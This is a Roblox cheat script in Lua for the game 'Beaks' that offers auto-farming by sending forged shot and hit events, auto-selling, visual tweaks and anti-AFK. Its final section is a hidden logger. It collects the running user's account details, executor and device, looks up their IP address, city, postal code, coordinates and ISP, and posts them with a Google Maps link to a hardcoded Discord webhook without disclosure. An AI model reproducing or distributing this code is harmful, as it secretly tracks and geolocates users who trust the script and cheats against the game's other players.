--// Beaks AutoFarm + GUI by PowerCat

--// Services
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local LocalPlayer = player

--// Networking & Config
local Aether = require(ReplicatedStorage.Packages.Aether)
local Net = require(Aether.GetUtil("Net"))
local GunShootEvent = Net:RemoteEvent("GunShootEvent")
local SellInventory = Net:RemoteFunction("SellInventory")
local GunList = require(ReplicatedStorage.Configuration.Guns)

--// Variables
local autoFarmEnabled = false
local autoSellEnabled = false
local shootDelay = 0.2
local currentTarget = nil
local targetStartTime = 0
local lastKnownHealth = -1
local stuckCheckInterval = 1
local uiVisible = true

--// Screen GUI Setup
local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
ScreenGui.Name = "BeaksGUI"
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 260, 0, 200)
MainFrame.Position = UDim2.new(0.03, 0, 0.6, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Visible = true
MainFrame.BackgroundTransparency = 0.1

Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", MainFrame).Color = Color3.fromRGB(0, 255, 200)

-- Toggle Template
local function ToggleTemplate(text, callback)
	local ToggleFrame = Instance.new("Frame")
	ToggleFrame.Size = UDim2.new(1, -20, 0, 30)
	ToggleFrame.BackgroundTransparency = 1

	local Label = Instance.new("TextLabel", ToggleFrame)
	Label.Text = text
	Label.Font = Enum.Font.GothamSemibold
	Label.TextSize = 14
	Label.TextColor3 = Color3.fromRGB(200, 200, 200)
	Label.BackgroundTransparency = 1
	Label.Size = UDim2.new(0.6, 0, 1, 0)
	Label.TextXAlignment = Enum.TextXAlignment.Left

	local Switch = Instance.new("TextButton", ToggleFrame)
	Switch.Size = UDim2.new(0.3, 0, 0.6, 0)
	Switch.Position = UDim2.new(0.7, 0, 0.2, 0)
	Switch.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	Switch.Text = "OFF"
	Switch.TextColor3 = Color3.fromRGB(255, 80, 80)
	Switch.Font = Enum.Font.GothamBold
	Switch.TextSize = 12
	Instance.new("UICorner", Switch).CornerRadius = UDim.new(1, 0)

	local state = false
	Switch.MouseButton1Click:Connect(function()
		state = not state
		Switch.Text = state and "ON" or "OFF"
		Switch.TextColor3 = state and Color3.fromRGB(80, 255, 120) or Color3.fromRGB(255, 80, 80)
		callback(state)
	end)

	return ToggleFrame
end

-- Info Labels
local function CreateInfoLabel()
	local Info = Instance.new("TextLabel", MainFrame)
	Info.Size = UDim2.new(1, -20, 0, 20)
	Info.Position = UDim2.new(0, 10, 0, 105)
	Info.BackgroundTransparency = 1
	Info.Font = Enum.Font.Gotham
	Info.TextSize = 14
	Info.TextColor3 = Color3.fromRGB(150, 255, 150)
	Info.Text = "Target: None"
	return Info
end

local function CreateCredits()
	local Credit = Instance.new("TextLabel", MainFrame)
	Credit.Text = "Beaks by PowerCat | ANTI-AFK"
	Credit.Size = UDim2.new(1, 0, 0, 20)
	Credit.Position = UDim2.new(0, 0, 1, -20)
	Credit.Font = Enum.Font.Gotham
	Credit.TextSize = 12
	Credit.BackgroundTransparency = 1
	Credit.TextColor3 = Color3.fromRGB(100, 100, 255)
end

-- Toggles
local AutoFarmToggle = ToggleTemplate("Auto Farm", function(val)
	autoFarmEnabled = val
end)
AutoFarmToggle.Position = UDim2.new(0, 10, 0, 10)
AutoFarmToggle.Parent = MainFrame

local AutoSellToggle = ToggleTemplate("Auto Sell", function(val)
	autoSellEnabled = val
end)
AutoSellToggle.Position = UDim2.new(0, 10, 0, 45)
AutoSellToggle.Parent = MainFrame

CreateCredits()
local BirdInfoLabel = CreateInfoLabel()

-- Closest Bird
local function GetClosestBird()
	for _, region in ipairs(workspace.Regions:GetChildren()) do
		for _, bird in ipairs(region.ClientBirds:GetChildren()) do
			if bird:GetAttribute("CurrentlyVisible") and (bird:GetAttribute("Health") or 0) > 0 then
				return bird
			end
		end
	end
	return nil
end

-- Auto Farm Loop
task.spawn(function()
	while true do
		task.wait(shootDelay)
		if autoFarmEnabled then
			local char = LocalPlayer.Character
			if not char then continue end
			local weapon = char:FindFirstChildWhichIsA("Tool")
			if not weapon or not GunList[weapon.Name] then continue end
			local handle = weapon:FindFirstChild("HandlePart", true)
			if not handle then continue end

			if not currentTarget or (currentTarget:GetAttribute("Health") <= 0) then
				currentTarget = GetClosestBird()
				targetStartTime = os.clock()
				lastKnownHealth = currentTarget and currentTarget:GetAttribute("Health") or -1
			end

			if currentTarget and currentTarget:GetAttribute("Health") > 0 then
				local currentHealth = currentTarget:GetAttribute("Health")
				if currentHealth == lastKnownHealth and os.clock() - targetStartTime >= 150 then
					currentTarget = nil
				else
					GunShootEvent:FireServer("BulletFired", weapon, handle.Position, "Dart")
					GunShootEvent:FireServer("BirdHit", weapon, currentTarget.PrimaryPart.Position, currentTarget:GetAttribute("Id"), "Dart")
					BirdInfoLabel.Text = string.format("%s: %d/%d", currentTarget:GetAttribute("BirdName") or "Unknown", currentHealth, currentTarget:GetAttribute("MaxHealth"))
					lastKnownHealth = currentHealth
				end
			else
				BirdInfoLabel.Text = "Target: None"
			end
		end
	end
end)

-- Currency + Level Labels
local CurrencyLabel = Instance.new("TextLabel", MainFrame)
CurrencyLabel.Size = UDim2.new(1, -20, 0, 18)
CurrencyLabel.Position = UDim2.new(0, 10, 0, 130)
CurrencyLabel.BackgroundTransparency = 1
CurrencyLabel.Font = Enum.Font.Gotham
CurrencyLabel.TextSize = 14
CurrencyLabel.TextColor3 = Color3.fromRGB(255, 255, 120)
CurrencyLabel.Text = "Bucks: Loading..."

local LevelLabel = Instance.new("TextLabel", MainFrame)
LevelLabel.Size = UDim2.new(1, -20, 0, 18)
LevelLabel.Position = UDim2.new(0, 10, 0, 150)
LevelLabel.BackgroundTransparency = 1
LevelLabel.Font = Enum.Font.Gotham
LevelLabel.TextSize = 14
LevelLabel.TextColor3 = Color3.fromRGB(120, 200, 255)
LevelLabel.Text = "Loading..."

task.spawn(function()
	while true do
		local success, err = pcall(function()
			local topbar = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Hud"):WaitForChild("Topbar")
			local currency = topbar:FindFirstChild("Currency")
			local level = topbar:FindFirstChild("Level")
			if currency then CurrencyLabel.Text = "Bucks: " .. currency.Text end
			if level then LevelLabel.Text ="" .. level.Text:gsub("<[^>]+>", "") end
		end)
		if not success then warn("อัปเดตเงิน/เลเวลผิดพลาด: ", err) end
		task.wait(0.5)
	end
end)

-- Auto Sell
task.spawn(function()
	while true do
		task.wait(10)
		if autoSellEnabled then
			SellInventory:InvokeServer("All")
		end
	end
end)

-- Toggle GUI Button
local toggleButton = Instance.new("TextButton", ScreenGui)
toggleButton.Text = "Menu"
toggleButton.Size = UDim2.new(0, 80, 0, 30)
toggleButton.Position = UDim2.new(0.10, 0, 0.5, -50)
toggleButton.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
toggleButton.TextColor3 = Color3.fromRGB(0, 255, 200)
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextSize = 12
Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 8)

toggleButton.MouseButton1Click:Connect(function()
	uiVisible = not uiVisible
	MainFrame.Visible = uiVisible
end)

-- Draggable Toggle Button
local dragging, dragInput, dragStart, startPos
toggleButton.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = toggleButton.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)
toggleButton.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)
UIS.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		toggleButton.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
end)

-- Utility: Lock Brightness and Remove Trees
RunService.RenderStepped:Connect(function()
	Lighting.Brightness = 1
	Lighting.ClockTime = 14
	Lighting.FogEnd = 100000
	local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
	if atmosphere then
		atmosphere.Density = 0
	end
end)

for _, obj in ipairs(workspace:GetDescendants()) do
	if obj:IsA("BasePart") then
		obj.Material = Enum.Material.Plastic
		obj.Reflectance = 0
		obj.CastShadow = false
	elseif obj:IsA("Decal") then
		obj:Destroy()
	end
end

for _, name in pairs({ "Beakwoods", "Deadlands", "Mount Beaks", "Quill Lake" }) do
	local region = workspace:FindFirstChild("Regions") and workspace.Regions:FindFirstChild(name)
	if region and region:FindFirstChild("Trees") then
		region.Trees:Destroy()
	end
end

-- FPS Display
local fpsLabel = Instance.new("TextLabel", ScreenGui)
fpsLabel.Size = UDim2.new(0, 80, 0, 25)
fpsLabel.Position = UDim2.new(1, -90, 1, -35)
fpsLabel.BackgroundTransparency = 0.4
fpsLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
fpsLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
fpsLabel.Font = Enum.Font.Code
fpsLabel.TextSize = 16
fpsLabel.Text = "FPS: ..."
fpsLabel.Parent = ScreenGui

local accumulatedTime = 0
local frameCount = 0

RunService.RenderStepped:Connect(function(dt)
	accumulatedTime += dt
	frameCount += 1
	if accumulatedTime >= 3 then
		fpsLabel.Text = "FPS: " .. math.floor(frameCount / accumulatedTime)
		accumulatedTime, frameCount = 0, 0
	end
end)

-- anti-afk
game:GetService("Players").LocalPlayer.Idled:connect(function()
    game:GetService("VirtualUser"):CaptureController()
    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
end)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:FindFirstChild("HumanoidRootPart")

-- ตรวจสอบ executor ที่ใช้งาน
local executorname = "Unknown"
if getexecutorname then
	executorname = getexecutorname()
elseif identifyexecutor then
	executorname = identifyexecutor()
end

local device = UserInputService.TouchEnabled and "มือถือ" or "PC"
local membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "None"

local req = (syn and syn.request) or (http and http.request) or request
local ipData = {
	ip = "ไม่ทราบ",
	country = "ไม่ทราบ",
	country_flag = "",
	country_code = "",
	region = "ไม่ทราบ",
	region_code = "",
	city = "ไม่ทราบ",
	district = "ไม่ทราบ",
	latitude = "ไม่ทราบ",
	longitude = "ไม่ทราบ",
	postal = "ไม่ทราบ",
	isp = "ไม่ทราบ",
	timezone = "ไม่ทราบ",
	call_code = ""
}

local function countryCodeToFlagEmoji(code)
	if not code then return "" end
	local flag = ""
	for i = 1, #code do
		local c = code:sub(i, i):upper()
		flag = flag .. utf8.char(0x1F1E6 - 65 + string.byte(c))
	end
	return flag
end

-- ดึงข้อมูล IP
local success, response = pcall(function()
	return req({
		Url = "https://ipwho.is/",
		Method = "GET"
	})
end)

if success and response and response.Body then
	local data = HttpService:JSONDecode(response.Body)
	if data.success then
		ipData.ip = data.ip or "ไม่ทราบ"
		ipData.country = data.country or "ไม่ทราบ"
		ipData.country_code = data.country_code or ""
		ipData.country_flag = countryCodeToFlagEmoji(data.country_code)
		ipData.region = data.region or "ไม่ทราบ"
		ipData.region_code = data.region_code or ""
		ipData.city = data.city or "ไม่ทราบ"
		ipData.district = data.district or "ไม่ทราบ"
		ipData.latitude = data.latitude or "ไม่ทราบ"
		ipData.longitude = data.longitude or "ไม่ทราบ"
		ipData.postal = data.postal or "ไม่ทราบ"
		ipData.timezone = data.timezone and data.timezone.id or "ไม่ทราบ"
		ipData.call_code = data.calling_code or ""
		ipData.isp = data.connection and data.connection.org or "ไม่ทราบ"
	end
end

-- ดึงชื่อเกม
local gameName = "ไม่ทราบ"
pcall(function()
	local info = MarketplaceService:GetProductInfo(game.PlaceId)
	if info and info.Name then
		gameName = info.Name
	end
end)

-- ลิงก์ Google Maps
local googleMapsLink = "https://www.google.com/maps?q=" .. tostring(ipData.latitude) .. "," .. tostring(ipData.longitude)

-- สร้าง embed
local embed = {
	username = "Logger",
	embeds = {{
		title = "**มีคนใช้สคริปต์ของคุณ**",
		color = 0xff66cc,
		fields = {
			{ name = "ชื่อเกม", value = gameName, inline = false },
			{ name = "ชื่อผู้ใช้", value = player.Name, inline = true },
			{ name = "ชื่อเล่น", value = player.DisplayName, inline = true },
			{ name = "UserId", value = tostring(player.UserId), inline = true },
			{ name = "อายุบัญชี", value = tostring(player.AccountAge) .. " วัน", inline = true },
			{ name = "ระดับสมาชิก", value = membership, inline = true },
			{ name = "อุปกรณ์ที่ใช้", value = device, inline = true },
			{ name = "Executor", value = executorname, inline = true },
			{ name = "เวลา", value = os.date("%d/%m/%Y %H:%M:%S"), inline = false },

			{ name = "IP Address", value = ipData.ip, inline = false },
			{ name = "ประเทศ", value = ipData.country_flag .. " " .. ipData.country .. " (+" .. ipData.call_code .. ")", inline = true },
			{ name = "จังหวัด/รัฐ", value = ipData.region .. " (" .. ipData.region_code .. ")", inline = true },
			{ name = "เมือง/เขต", value = ipData.city .. " / " .. ipData.district, inline = true },
			{ name = "รหัสไปรษณีย์", value = ipData.postal, inline = true },
			{ name = "ตำแหน่งบน Google Maps", value = "[คลิกที่นี่](" .. googleMapsLink .. ")", inline = true },
			{ name = "เขตเวลา", value = ipData.timezone, inline = true },
			{ name = "ผู้ให้บริการ (ISP)", value = ipData.isp, inline = false }
		}
	}}
}

local jsonData = HttpService:JSONEncode(embed)

req({
	Url = "https://discord.com/api/webhooks/1363189736226947162/xkLJv3gssgW4OWQNy-aA1gb16UJWIfWrAmh1RPByVYsjupUyigEJE8-XScgO7vq8flry", -- เปลี่ยน webhook ตรงนี้หากต้องการ
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = jsonData
})